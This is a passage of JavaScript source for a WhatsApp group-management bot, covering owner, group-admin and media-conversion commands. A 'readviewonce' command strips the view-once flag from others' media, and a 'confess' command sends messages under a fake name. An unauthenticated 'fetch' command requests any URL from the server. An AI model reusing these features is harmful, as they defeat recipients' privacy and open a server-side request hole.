                	}
                }
                break
			case 'setbio': case 'setbotbio': {
				if (!XeonTheCreator) return XeonStickOwner()
				if (!text) return replygcxeon(`Where's the text??`)
				XeonBotInc.setStatus(q)
				replygcxeon(`*Bio has been changed to ${q}*`)
			}
			break
			case 'setbotpp':
            case 'setpp':
            case 'setpp':
            case 'setppbot':
                if (!XeonTheCreator) return XeonStickOwner()
                if (!quoted) return replygcxeon(`Send/Reply Image With Caption ${prefix + command}`)
                if (!/image/.test(mime)) return replygcxeon(`Send/Reply Image With Caption ${prefix + command}`)
                if (/webp/.test(mime)) return replygcxeon(`Send/Reply Image With Caption ${prefix + command}`)
                var medis = await XeonBotInc.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
                if (args[0] == 'full') {
                    var {
                        img
                    } = await generateProfilePicture(medis)
                    await XeonBotInc.query({
                        tag: 'iq',
                        attrs: {
                            to: botNumber,
                            type: 'set',
                            xmlns: 'w:profile:picture'
                        },
                        content: [{
                            tag: 'picture',
                            attrs: {
                                type: 'image'
                            },
                            content: img
                        }]
                    })
                    fs.unlinkSync(medis)
                    replygcxeon(mess.done)
                } else {
                    var memeg = await XeonBotInc.updateProfilePicture(botNumber, {
                        url: medis
                    })
                    fs.unlinkSync(medis)
                    replygcxeon(mess.done)
                }
                break
			case 'join': {
				if (!XeonTheCreator) return XeonStickOwner()
				if (!text) return replygcxeon('Enter Group Link!')
				if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return replygcxeon('Link Invalid!')
				const result = args[0].split('https://chat.whatsapp.com/')[1]
				XeonStickWait()
				await XeonBotInc.groupAcceptInvite(result).catch((res) => {
					if (res.data == 400) return replygcxeon('Group Not Found❗');
					if (res.data == 401) return replygcxeon('Bot Kicked From The Group❗');
					if (res.data == 409) return replygcxeon('Bots Have Joined the Group❗');
					if (res.data == 410) return replygcxeon('Group URL Has Been Reset❗');
					if (res.data == 500) return replygcxeon('Full Group❗');
				})
			}
			break
			case 'leave': case 'leavegc': {
				if (!XeonTheCreator) return XeonStickOwner()
				await XeonBotInc.groupLeave(m.chat).then((res) => replygcxeon(jsonformat(res))).catch((err) => replygcxeon(jsonformat(err)))
			}
			break
			case 'blokir': case 'block': {
				if (!XeonTheCreator) return XeonStickOwner()
				if (!text && !m.quoted) {
					replygcxeon(`Example: ${prefix + command} 91xxx`)
				} else {
					const numbersOnly = m.isGroup ? (text ? text.replace(/\D/g, '') + '@s.whatsapp.net' : m.quoted?.sender) : m.chat
					await XeonBotInc.updateBlockStatus(numbersOnly, 'block').then((a) => replygcxeon(mess.done)).catch((err) => replygcxeon('Fail!'))
				}
			}
			break
			case 'openblokir': case 'unblokir': case 'openblock': case 'unblock': {
				if (!XeonTheCreator) return XeonStickOwner()
				if (!text && !m.quoted) {
					replygcxeon(`Example: ${prefix + command} 91xxx`)
				} else {
					const numbersOnly = m.isGroup ? (text ? text.replace(/\D/g, '') + '@s.whatsapp.net' : m.quoted?.sender) : m.chat
					await XeonBotInc.updateBlockStatus(numbersOnly, 'unblock').then((a) => replygcxeon(mess.done)).catch((err) => replygcxeon('Fail!'))
				}
			}
			break
			case 'listpc': {
				if (!XeonTheCreator) return XeonStickOwner()
				let anu = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
				let teks = `⬣ *LIST PERSONAL CHAT*\n\nTotal Chat : ${anu.length} Chat\n\n`
				for (let i of anu) {
					let nama = store.messages[i].array[0].pushName
					teks += `${setv} *Name :* ${nama}\n${setv} *User :* @${i.split('@')[0]}\n${setv} *Chat :* https://wa.me/${i.split('@')[0]}\n\n=====================\n\n`
				}
				XeonBotInc.sendTextMentions(m.chat, teks, m)
			}
			break
			case 'listgc': {
				if (!XeonTheCreator) return XeonStickOwner()
				let anu = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
				let teks = `⬣ *LIST GROUP CHAT*\n\nTotal Group : ${anu.length} Group\n\n`
				for (let i of anu) {
					let metadata = await XeonBotInc.groupMetadata(i)
					teks += `${setv} *Name :* ${metadata.subject}\n${setv} *Admin :* ${metadata.owner ? `@${metadata.owner.split('@')[0]}` : '-' }\n${setv} *ID :* ${metadata.id}\n${setv} *Made :* ${moment(metadata.creation * 1000).tz('Asia/Kolkata').format('DD/MM/YYYY HH:mm:ss')}\n${setv} *Member :* ${metadata.participants.length}\n\n=====================\n\n`
				}
				XeonBotInc.sendTextMentions(m.chat, teks, m)
			}
			break
			case 'creategc': {
				if (!XeonTheCreator) return XeonStickOwner()
				if (!text) return replygcxeon(`Example:\n${prefix + command} *Gc Name*`)
				let group = await XeonBotInc.groupCreate(q, [m.sender])
				let res = await XeonBotInc.groupInviteCode(group.id)
				await XeonBotInc.sendMessage(m.chat, { text: `*Link Group :* *https://chat.whatsapp.com/${res}*\n\n*Group Name :* *${q}*`, detectLink: true }, { quoted: m });
				await XeonBotInc.groupParticipantsUpdate(group.id, [m.sender], 'promote')
				await XeonBotInc.sendMessage(group.id, { text: 'Done' })
			}
			break
			case 'addpr': case 'addprem': case 'addpremium': {
				if (!XeonTheCreator) return XeonStickOwner()
				if (!text) return replygcxeon(`Example:\n${prefix + command} @tag|time(s/m/h/d)`)
				let [teks1, teks2] = text.split`|`
				const nmrnya = teks1.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
				const onWa = await XeonBotInc.onWhatsApp(nmrnya)
				if (!onWa.length > 0) return replygcxeon('This number is not registered on WhatsApp!')
				if (teks2) {
					prem.addPremiumUser(nmrnya, teks2, premium);
					replygcxeon(`Success ${command} @${nmrnya.split('@')[0]} During ${teks2}`)
					global.db.users[nmrnya].limit = global.db.users[nmrnya].vip ? global.limit.vip : global.limit.premium
					global.db.users[nmrnya].uang = global.db.users[nmrnya].vip ? global.uang.vip : global.uang.premium
				} else {
					replygcxeon(`Enter the time!\nExample: ${prefix + command} @tag|time`)
				}
			}
			break
			case 'delpr': case 'delprem': case 'delpremium': {
				if (!XeonTheCreator) return XeonStickOwner()
				if (!text) return replygcxeon(`Example:\n${prefix + command} @tag`)
				const nmrnya = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
				if (prem.checkPremiumUser(nmrnya, premium)) {
					premium.splice(prem.getPremiumPosition(nmrnya, premium), 1);
					fs.writeFileSync('./database/premium.json', JSON.stringify(premium));
					replygcxeon(`Sukses ${command} @${nmrnya.split('@')[0]}`)
					global.db.users[nmrnya].limit = global.db.users[nmrnya].vip ? global.limit.vip : global.limit.free
					global.db.users[nmrnya].uang = global.db.users[nmrnya].vip ? global.uang.vip : global.uang.free
				} else {
					replygcxeon(`User @${nmrnya.split('@')[0]} Not Premium❗`)
				}
			}
			break
			case 'listpr': case 'listprem': case 'listpremium': {
				if (!XeonTheCreator) return XeonStickOwner()
				let txt = `*------「 LIST PREMIUM 」------*\n\n`
				for (let userprem of premium) {
					txt += `➸ *Number*: @${userprem.id.split('@')[0]}\n➸ *Limit*: ${global.db.users[userprem.id].limit}\n➸ *Money*: ${global.db.users[userprem.id].uang.toLocaleString('id-ID')}\n➸ *Expired*: ${formatDate(userprem.expired)}\n\n`
				}
				replygcxeon(txt)
			}
			break
			
			// Group Menu
			case 'add': {
				if (!m.isGroup) return XeonStickGroup()
				if (!m.isAdmin) return XeonStickAdmin()
				if (!m.isBotAdmin) return XeonStickBotAdmin()
				if (!text && !m.quoted) {
					replygcxeon(`EXAMPLE: ${prefix + command} 91xxx`)
				} else {
					const numbersOnly = text ? text.replace(/\D/g, '') + '@s.whatsapp.net' : m.quoted?.sender
					try {
						await XeonBotInc.groupParticipantsUpdate(m.chat, [numbersOnly], 'add').then(async (res) =>{
							for (let i of res) {
								let invv = await XeonBotInc.groupInviteCode(m.chat)
								if (i.status == 408) return replygcxeon('User Just Left This Group!')
								if (i.status == 401) return replygcxeon('User Blocked The Bot!')
								if (i.status == 409) return replygcxeon('User has joined!')
								if (i.status == 500) return replygcxeon('Group Full!')
								if (i.status == 403) {
									await XeonBotInc.sendMessage(m.chat, { text: `@${numbersOnly.split('@')[0]} Cannot Be Added\n\nBecause Target Private\n\nInvitations will be sent to\n-> wa.me/${numbersOnly.replace(/\D/g, '')}\nVia Private Chat`, mentions: [numbersOnly] }, { quoted : m })
									await XeonBotInc.sendMessage(`${numbersOnly ? numbersOnly : '916909137213@s.whatsapp.net'}`, { text: `${'https://chat.whatsapp.com/' + invv}\n------------------------------------------------------\n\nAdmin: wa.me/${m.sender}\nInvite you to this group\nPlease enter if you wish🙇`, detectLink: true, mentions: [numbersOnly] }, { quoted : floc2 }).catch((err) => replygcxeon('Failed to Send Invitation!'))
								} else {
									replygcxeon('Success!!')
								}
							}
						})
					} catch (e) {
						replygcxeon('Failed to Add User')
					}
				}
			}
			break
			case 'kick': {
				if (!m.isGroup) return XeonStickGroup()
				if (!m.isAdmin) return XeonStickAdmin()
				if (!m.isBotAdmin) return XeonStickBotAdmin()
				if (!text && !m.quoted) {
					replygcxeon(`Example: ${prefix + command} 91xxx`)
				} else {
					const numbersOnly = text ? text.replace(/\D/g, '') + '@s.whatsapp.net' : m.quoted?.sender
					await XeonBotInc.groupParticipantsUpdate(m.chat, [numbersOnly], 'remove').catch((err) => replygcxeon('Failed to Kick User!'))
				}
			}
			break
			case 'promote': {
				if (!m.isGroup) return XeonStickGroup()
				if (!m.isAdmin) return XeonStickAdmin()
				if (!m.isBotAdmin) return XeonStickBotAdmin()
				if (!text && !m.quoted) {
					replygcxeon(`Example: ${prefix + command} 91xxx`)
				} else {
					const numbersOnly = text ? text.replace(/\D/g, '') + '@s.whatsapp.net' : m.quoted?.sender
					await XeonBotInc.groupParticipantsUpdate(m.chat, [numbersOnly], 'promote').catch((err) => replygcxeon('Fail!'))
					replygcxeon(mess.done)
				}
			}
			break
			case 'demote': {
				if (!m.isGroup) return XeonStickGroup()
				if (!m.isAdmin) return XeonStickAdmin()
				if (!m.isBotAdmin) return XeonStickBotAdmin()
				if (!text && !m.quoted) {
					replygcxeon(`Example: ${prefix + command} 91xxx`)
				} else {
					const numbersOnly = text ? text.replace(/\D/g, '') + '@s.whatsapp.net' : m.quoted?.sender
					await XeonBotInc.groupParticipantsUpdate(m.chat, [numbersOnly], 'demote').catch((err) => replygcxeon('Failed!'))
					replygcxeon(mess.done)
				}
			}
			break
			case 'setnamegc': case 'setsubject': case 'setname': case 'setnamegc': case 'setsubject': case 'setsubjectgc': {
				if (!m.isGroup) return XeonStickGroup()
				if (!m.isAdmin) return XeonStickAdmin()
				if (!m.isBotAdmin) return XeonStickBotAdmin()
				if (!text && !m.quoted) {
					replygcxeon(`Example: ${prefix + command} text`)
				} else {
					const teksnya = text ? text : m.quoted.text
					await XeonBotInc.groupUpdateSubject(m.chat, teksnya).catch((err) => replygcxeon('Fail!'))
				}
			}
			break
			case 'setdesc': case 'setdescgc': case 'setdesk': case 'setdeskgc': {
				if (!m.isGroup) return XeonStickGroup()
				if (!m.isAdmin) return XeonStickAdmin()
				if (!m.isBotAdmin) return XeonStickBotAdmin()
				if (!text && !m.quoted) {
					replygcxeon(`Example: ${prefix + command} textnya`)
				} else {
					const teksnya = text ? text : m.quoted.text
					await XeonBotInc.groupUpdateDescription(m.chat, teksnya).catch((err) => replygcxeon('Fail!'))
				}
			}
			break
			case 'setppgroup':
            case 'setppgrup':
            case 'setppgc':
            case 'setgrouppp':
            case 'setgruppp':
            case 'setgcpp':
                if (!m.isGroup) return XeonStickGroup()
                if (!m.isAdmin) return replygcxeon(mess.admin)
                if (!m.isBotAdmin) return XeonStickBotAdmin()
                if (!quoted) return replygcxeon(`Send/Reply Image With Caption ${prefix + command}`)
                if (!/image/.test(mime)) return replygcxeon(`Send/Reply Image Caption Caption ${prefix + command}`)
                if (/webp/.test(mime)) return replygcxeon(`Send/Reply Image With Caption ${prefix + command}`)
                var medis = await XeonBotInc.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
                if (args[0] == 'full') {
                    var {
                        img
                    } = await generateProfilePicture(medis)
                    await XeonBotInc.query({
                        tag: 'iq',
                        attrs: {
                            to: m.chat,
                            type: 'set',
                            xmlns: 'w:profile:picture'
                        },
                        content: [{
                            tag: 'picture',
                            attrs: {
                                type: 'image'
                            },
                            content: img
                        }]
                    })
                    fs.unlinkSync(medis)
                    replygcxeon(mess.done)
                } else {
                    var memeg = await XeonBotInc.updateProfilePicture(m.chat, {
                        url: medis
                    })
                    fs.unlinkSync(medis)
                    replygcxeon(mess.done)
                }
                break
			case 'delete': case 'del': case 'd': {
				if (!m.quoted) return replygcxeon('Reply to the message you want to delete')
				await XeonBotInc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: m.isBotAdmin ? false : true, id: m.quoted.id, participant: m.quoted.sender }})
			}
			break
			case 'linkgroup': case 'linkgrup': case 'linkgc': case 'urlgroup': case 'urlgrup': case 'urlgc': {
				if (!m.isGroup) return XeonStickGroup()
				if (!m.isAdmin) return XeonStickAdmin()
				if (!m.isBotAdmin) return XeonStickBotAdmin()
				let response = await XeonBotInc.groupInviteCode(m.chat)
				await XeonBotInc.sendMessage(m.chat, { text: `https://chat.whatsapp.com/${response}\n\nLink Group : ${(await XeonBotInc.groupMetadata(m.chat)).subject}`, detectLink: true }, { quoted: m });
			}
			break
			case 'resetlink': case 'revoke': case 'newlink': case 'newurl': {
				if (!m.isGroup) return XeonStickGroup()
				if (!m.isAdmin) return XeonStickAdmin()
				if (!m.isBotAdmin) return XeonStickBotAdmin()
				await XeonBotInc.groupRevokeInvite(m.chat).then((a) => {
					replygcxeon(`Reset Success, Group Invite Link ${m.metadata.subject}`)
				}).catch((err) => replygcxeon('Fail!'))
			}
			break
			case 'group': case 'grup': {
				if (!m.isGroup) return XeonStickGroup()
				if (!m.isAdmin) return XeonStickAdmin()
				if (!m.isBotAdmin) return XeonStickBotAdmin()
				if (text === 'close') {
					await XeonBotInc.groupSettingUpdate(m.chat, 'announcement').then((res) => replygcxeon(`*Successfully Closing The Group*`))
				} else if (text === 'open') {
					await XeonBotInc.groupSettingUpdate(m.chat, 'not_announcement').then((res) => replygcxeon(`*Successfully Opening The Group*`))
				} else {
					let button = [{
						name: 'single_select',
						buttonParamsJson: {
							title: 'SELECT',
							sections: [{
								title: 'Group Mode',
								rows: [
									{ title: 'Open Group', description: 'Open Group', id: 'grup open' },
									{ title: 'Close Group', description: 'Close Group', id: 'grup close' },
								]
							}]
						}
					}]
					await XeonBotInc.sendButtonMsg(m.chat, 'Group Mode', xeonytimewisher, 'Please choose', null, button, m);
				}
			}
			break
			case 'deleteppgroup': case 'delppgc': case 'deleteppgc': case 'delppgroup': {
if (!m.isGroup) return XeonStickGroup()
if (!m.isAdmin && !XeonTheCreator) return XeonStickAdmin()
if (!m.isBotAdmin) return XeonStickBotAdmin()
    await XeonBotInc.removeProfilePicture(m.chat)
    }
    break
    case 'deleteppbot': case 'delbotpp': case 'delppbot': {
if (!XeonTheCreator) return XeonStickOwner()
    await XeonBotInc.removeProfilePicture(XeonBotInc.user.id)
    replygcxeon(`Success in deleting bot's profile picture`)
    }
    break
			case 'antidelete': {
				if (!m.isGroup) return XeonStickGroup()
				if (!m.isAdmin) return XeonStickAdmin()
				if (!m.isBotAdmin) return XeonStickBotAdmin()
				if (text === 'on') {
					if (db.groups[m.chat].antidelete) return replygcxeon('*Sudah Aktif Sebelumnya*')
					db.groups[m.chat].antidelete = true
					replygcxeon('*Anti Delete Activated !*')
				} else if (text === 'off') {
					db.groups[m.chat].antidelete = false
					replygcxeon('*Anti Delete Disabled !*')
				} else {
					let buttonnya = [{
						name: 'single_select',
						buttonParamsJson: {
							title: 'Pilih',
							sections: [{
								title: 'Anti Delete',
								rows: [
									{ title: 'ENABLE', description: 'Enable Antidelete', id: 'antidelete on' },
									{ title: 'DISABLE', description: 'Disable Antidelete', id: 'antidelete off' },
								]
							}]
						}
					}]
					await XeonBotInc.sendButtonMsg(m.chat, 'Group Mode', xeonytimewisher, 'Please choose', null, buttonnya, m);
				}
			}
			break
			case 'tagall': {
				if (!m.isGroup) return XeonStickGroup()
				if (!m.isAdmin) return XeonStickAdmin()
				if (!m.isBotAdmin) return XeonStickBotAdmin()
				let teks = `*Tag All*\n\n*Message :* ${q ? q : ''}\n\n`
				for (let mem of m.metadata.participants) {
					teks += `${setv} @${mem.id.split('@')[0]}\n`
				}
				await XeonBotInc.sendMessage(m.chat, { text: teks, mentions: m.metadata.participants.map(a => a.id) }, { quoted: m })
			}
			break
			case 'hidetag': case 'h': {
				if (!m.isGroup) return XeonStickGroup()
				if (!m.isAdmin) return XeonStickAdmin()
				if (!m.isBotAdmin) return XeonStickBotAdmin()
				XeonBotInc.sendMessage(m.chat, { text : q ? q : '' , mentions: m.metadata.participants.map(a => a.id)}, { quoted: m })
			}
			break
			case 'totag': {
				if (!m.isGroup) return XeonStickGroup()
				if (!m.isAdmin) return XeonStickAdmin()
				if (!m.isBotAdmin) return XeonStickBotAdmin()
				if (!m.quoted) return replygcxeon(`Reply messages with captions ${prefix + command}`)
				delete m.quoted.chat
				await XeonBotInc.sendMessage(m.chat, { forward: m.quoted.fakeObj, mentions: m.metadata.participants.map(a => a.id) })
			}
			break
			case 'listonline': case 'liston': {
				if (!m.isGroup) return XeonStickGroup()
				let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
				let online = [...Object.keys(store.presences[id]), botNumber]
				await XeonBotInc.sendMessage(m.chat, { text: 'List Online:\n\n' + online.map(v => `${setv} @` + v.replace(/@.+/, '')).join`\n`, mentions: online }, { quoted: m }).catch((e) => replygcxeon('Fail'))
			}
			break
			
			// Bot Menu
			case 'owner': {
				let list = []
for (let i of owner) {
list.push({
	    	displayName: await XeonBotInc.getName(i),
	    	vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await XeonBotInc.getName(i)}\nFN:${await XeonBotInc.getName(i)}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${ytname}\nitem2.X-ABLabel:YouTube\nitem3.URL:${socialm}\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${location};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`
	    })
	}
                XeonBotInc.sendMessage(m.chat, {
                    contacts: {
                        displayName: `${list.length} Contact`,
                        contacts: list
                    }, contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                }, {
                    quoted: m
                })
            }
            break
			case 'profile': case 'cekme': case 'cek': {
				const user = Object.keys(global.db.users)
				const infoUser = global.db.users[m.sender]
				const teks = `*Profile @${m.sender.split('@')[0]}* :\nUser Bot : ${user.includes(m.sender) ? 'True' : 'False'}\nUser : ${isVip ? 'VIP' : isPremium ? 'PREMIUM' : 'FREE'}\nLimit : ${infoUser.limit}\nMoney : ${infoUser ? infoUser.uang.toLocaleString('id-ID') : '0'}`
				await XeonBotInc.sendTextMentions(m.chat, teks, m)
			}
			break
			case 'req': case 'request': {
				if (!text) return replygcxeon('What do you want to request from the owner??')
				await XeonBotInc.sendMessage(m.chat, { text: `*Request Has Been Sent To Owner*\n_Thank You🙏_` }, { quoted: m })
				await XeonBotInc.sendFromOwner(ownernumber, `Order From : @${m.sender.split('@')[0]}\nFor Owners\n\nRequest ${text}`, m, { contextInfo: { mentionedJid: [m.sender], isForwarded: true }})
			}
			break
			case 'daily': case 'claim': {
				daily(XeonBotInc, m, global.db.users)
			}
			break
			case 'transferlimit': case 'tflimit': case 'tlimit': {
				transferLimit(XeonBotInc, m, args, global.db.users)
			}
			break
			case 'transfermoney': case 'tmoney': case 'transfer': {
				transferUang(XeonBotInc, m, args, global.db.users)
			}
			break
			case 'buy': {
				buy(m, args, db)
			}
			break
			case 'react': {
				XeonBotInc.sendMessage(m.chat, { react: { text: args[0], key: m.quoted ? m.quoted.key : m.key }})
			}
			break
			case 'tagme': {
				XeonBotInc.sendMessage(m.chat, { text: `@${m.sender.split('@')[0]}`, mentions: [m.sender] }, { quoted: m })
			}
			break
			
			case 'p': case 'ping': case 'botstatus': case 'statusbot': {
				const used = process.memoryUsage()
				const cpus = os.cpus().map(cpu => {
					cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
					return cpu
				})
				const cpu = cpus.reduce((last, cpu, _, { length }) => {
					last.total += cpu.total
					last.speed += cpu.speed / length
					last.times.user += cpu.times.user
					last.times.nice += cpu.times.nice
					last.times.sys += cpu.times.sys
					last.times.idle += cpu.times.idle
					last.times.irq += cpu.times.irq
					return last
				}, {
					speed: 0,
					total: 0,
					times: {
						user: 0,
						nice: 0,
						sys: 0,
						idle: 0,
						irq: 0
					}
				})
				let timestamp = speed()
				let latensi = speed() - timestamp
				neww = performance.now()
				oldd = performance.now()
				respon = `Response Speed ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}\n\n💻 Info Server\nRAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}\n\n_NodeJS Memory Usaage_\n${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}\n\n${cpus[0] ? `_Total CPU Usage_\n${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}\n_CPU Core(s) Usage (${cpus.length} Core CPU)_\n${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}`.trim()
				replygcxeon(respon)
			}
			break
			case 'speedtest': case 'speed': {
				replygcxeon('Testing Speed...')
				let cp = require('child_process')
				let { promisify } = require('util')
				let exec = promisify(cp.exec).bind(cp)
				let o
				try {
					o = await exec('python3 speed.py')
				} catch (e) {
					o = e
				} finally {
					let { stdout, stderr } = o
					if (stdout.trim()) replygcxeon(stdout)
					if (stderr.trim()) replygcxeon(stderr)
				}
			}
			break
			case 'afk': {
				let user = global.db.users[m.sender]
				user.afkTime = + new Date
				user.afkReason = text
				replygcxeon(`@${m.sender.split('@')[0]} Been Afk ${text ? ': ' + text : ''}`)
			}
			break
			case 'readviewonce': case 'readviewone': case 'rvo': {
				if (!m.quoted) return replygcxeon(`Reply view once message\nExample: ${prefix + command}`)
				if (m.quoted.msg.viewOnce) {
					m.quoted.msg.viewOnce = false
					await XeonBotInc.sendMessage(m.chat, { forward: m.quoted }, { quoted: m })
				} else if (m.quoted.msg.message && m.quoted.msg.message.audioMessage && m.quoted.msg.message.audioMessage.viewOnce) {
					m.quoted.msg.message.audioMessage.viewOnce = false
					m.quoted.msg.message.audioMessage.contextInfo = { forwardingScore: 1, isForwarded: true, mentionedJid: [m.sender] }
					await XeonBotInc.relayMessage(m.chat, m.quoted.msg.message, {})
				} else {
					replygcxeon(`Reply view once message\nExample: ${prefix + command}`)
				}
			}
			break
			case 'inspect': {
				if (!text) return replygcxeon('Enter Group Link!')
				let code = q.match(/chat.whatsapp.com\/([\w\d]*)/g);
				if (code === null) return replygcxeon('No invite url detected.');
				code = code[0].replace('chat.whatsapp.com/', '');
				await XeonBotInc.groupGetInviteInfo(code).then(anu => {
					let { id, subject, owner, subjectOwner, creation, desc, descId, participants, size, descOwner } = anu
					console.log(anu);
					let par = `*Gc Name* : ${subject}\n*ID* : ${id}\n${owner ? `*Creator* : @${owner.split('@')[0]}` : '*Creator* : -'}\n*Number of Members* : ${size}\n*Gc Created Date* : ${new Date(creation * 1000).toLocaleString()}\n*DescID* : ${descId ? descId : '-'}\n${subjectOwner ? `*GC Name Changed By* : @${subjectOwner.split('@')[0]}` : '*GC Name Changed By* : -'}\n${descOwner ? `*Desc changed by* : @${descOwner.split('@')[0]}` : '*Desc changed by* : -'}\n\n*Desc* : ${desc ? desc : '-'}\n`;
					XeonBotInc.sendTextMentions(m.chat, par, m);
				}).catch((res) => {
					if (res.data == 406) return replygcxeon('Group Not Found❗');
					if (res.data == 410) return replygcxeon('Group URL Has Been Reset❗');
				});
			}
			break
			case 'q': case 'quoted': {
				if (!m.quoted) return replygcxeon('Reply the message!')
				const anu = await m.getQuotedObj()
				if (!anu) return replygcxeon('Format Not Available!')
				if (!anu.quoted) return replygcxeon('The Message You Reply Does Not Contain a Reply')
				await XeonBotInc.relayMessage(m.chat, { [anu.quoted.type]: anu.quoted.msg }, {})
			}
			break
			case 'confes': case 'confess': case 'menfes': case 'menfess': {
				if (m.isGroup) return XeonStickPrivate();
				if (game.menfes[m.sender]) return replygcxeon(`You're In Session ${command}!`)
				if (!text) return replygcxeon(`Example : ${prefix + command} 91xxxx|Fake name`)
				let [teks1, teks2] = text.split`|`
				if (!isNaN(teks1) && !teks1.startsWith('0') && teks1) {
					const tujuan = teks1.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
					const onWa = await XeonBotInc.onWhatsApp(tujuan)
					if (!onWa.length > 0) return replygcxeon('This number is not registered on WhatsApp!')
					game.menfes[m.sender] = {
						tujuan: tujuan,
						nama: teks2,
						waktu: setTimeout(() => {
							if (game.menfes[m.sender]) replygcxeon(`_Time ${command} finished_`)
							delete game.menfes[m.sender];
						}, 600000)
					};
					game.menfes[tujuan] = {
						tujuan: m.sender,
						nama: 'Recipient',
						waktu: setTimeout(() => {
							if (game.menfes[tujuan]) XeonBotInc.sendMessage(tujuan, { text: `_Time ${command} finished_` });
							delete game.menfes[tujuan];
						}, 600000)
					};
					XeonBotInc.sendMessage(tujuan, { text: `_${command} connected_\n*Note :* if you want to end, type _*${prefix}del${command}*_` });
					replygcxeon(`_Start ${command}..._\n*Please start sending messages/media*\n*Duration ${command} only for 10 minutes*\n*Note :* if you want to end, type _*${prefix}del${command}*_`)
				} else {
					replygcxeon(`Enter the number!\nExample : ${prefix + command} 91xxxx|Fake name`)
				}
			}
			break
			case 'delconfes': case 'delconfess': case 'delmenfes': case 'delmenfess': {
				if (!game.menfes[m.sender]) return replygcxeon(`You Are Not In ${command.split('del')[1]} session!`)
				let anu = game.menfes[m.sender]
				XeonBotInc.sendMessage(anu.tujuan, { text: `Chat Ended By ${anu.nama ? anu.nama : 'Somebody'}` })
				replygcxeon(`Successfully Ends Session ${command.split('del')[1]}!`)
				delete game.menfes[anu.tujuan];
				delete game.menfes[m.sender];
			}
			break
			
			// Tools Menu
			case 'fetch': case 'get': {
				if (!text.startsWith('http')) return replygcxeon(`No Query?\n\nExample : ${prefix + command} https://google.com`)
				try {
					const res = await axios.get(isUrl(text) ? isUrl(text)[0] : text)
					if (!/json|html|plain/.test(res.headers['content-type'])) {
						await replygcxeon(text)
					} else {
						replygcxeon(util.format(res.data))
					}
				} catch (e) {
					replygcxeon(util.format(e))
				}
			}
			break
			case 'toaud': case 'toaudio': {
				if (!/video/.test(mime) && !/audio/.test(mime)) return replygcxeon(`Send/Reply Video/Audio that you want to make into audio with captions ${prefix + command}`)
				XeonStickWait()
				let media = await (m.quoted ? m.quoted.download() : m.download())
				let audio = await toAudio(media, 'mp4')
				await XeonBotInc.sendMessage(m.chat, { audio: audio, mimetype: 'audio/mpeg'}, { quoted : m })
			}
			break
			case 'tomp3': {
				if (!/video/.test(mime) && !/audio/.test(mime)) return replygcxeon(`Send/Reply Video/Audio that you want to make into audio with captions ${prefix + command}`)
				XeonStickWait()
				let media = await (m.quoted ? m.quoted.download() : m.download())
				let audio = await toAudio(media, 'mp4')
				await XeonBotInc.sendMessage(m.chat, { document: audio, mimetype: 'audio/mpeg', fileName: `dgxeon.mp3`}, { quoted : m })
			}
			break
			case 'tovn': case 'toptt': case 'tovoice': {
				if (!/video/.test(mime) && !/audio/.test(mime)) return replygcxeon(`Send/Reply Video/Audio that you want to make into audio with captions ${prefix + command}`)
				XeonStickWait()
				let media = await (m.quoted ? m.quoted.download() : m.download())
				let audio = await toPTT(media, 'mp4')
				await XeonBotInc.sendMessage(m.chat, { audio: audio, mimetype: 'audio/ogg; codecs=opus', ptt: true }, { quoted: m })
			}
			break
			case 'togif': {
				if (!/webp/.test(mime) && !/video/.test(mime)) return replygcxeon(`Reply Video/Sticker with caption *${prefix + command}*`)
				XeonStickWait()
				let { webp2mp4File } = require('./lib/uploader')
				let media = await XeonBotInc.downloadAndSaveMediaMessage(qmsg)
				let webpToMp4 = await webp2mp4File(media)
				await XeonBotInc.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, { quoted: m })
				await fs.unlinkSync(media)
			}
			break
			case 'tovideo': case 'tomp4': {
				if (!/webp/.test(mime) && !/video/.test(mime)) return replygcxeon(`Reply Video/Sticker with caption *${prefix + command}*`)
				XeonStickWait()
				let { webp2mp4File } = require('./lib/uploader')
				let media = await XeonBotInc.downloadAndSaveMediaMessage(qmsg)
				let webpToMp4 = await webp2mp4File(media)
				await XeonBotInc.sendMessage(m.chat, { video: { url: webpToMp4.result }, caption: 'Convert Webp To Video' }, { quoted: m })
				await fs.unlinkSync(media)
			}
			break
			case 'toimage': case 'toimg': {
				if (!/webp/.test(mime)) return replygcxeon(`Reply Video/Sticker with caption *${prefix + command}*`)
				XeonStickWait()
				let media = await XeonBotInc.downloadAndSaveMediaMessage(qmsg)
				let ran = await getRandom('.png')
				exec(`ffmpeg -i ${media} ${ran}`, (err) => {
					fs.unlinkSync(media)
					if (err) return replygcxeon('Fail❗')
					let buffer = fs.readFileSync(ran)
